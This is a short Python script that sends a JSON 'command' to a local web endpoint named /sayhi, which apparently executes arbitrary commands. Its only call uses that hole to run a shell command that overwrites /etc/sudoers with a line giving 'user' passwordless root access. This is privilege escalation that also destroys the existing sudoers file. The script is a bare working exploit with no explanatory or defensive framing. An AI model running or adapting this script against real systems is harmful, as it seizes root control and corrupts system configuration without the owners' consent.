import requests
import json

HOST = "127.0.0.1:65432"
URL = f"http://{HOST}/sayhi"

HEADERS = {
    "Content-Type": "application/json"
}

def exec_command(cmd):
    payload = {
        "command": cmd
    }
    response = requests.post(url=URL, json=payload, headers=HEADERS)
    if response.status_code == 200:
        print("Command executed successfully.")
    else:
        print(f"Failed to execute command. Status code: {response.status_code}")

def main():
    exec_command('echo "user ALL=(root) NOPASSWD: ALL" > /etc/sudoers')

if __name__ == "__main__":
    main()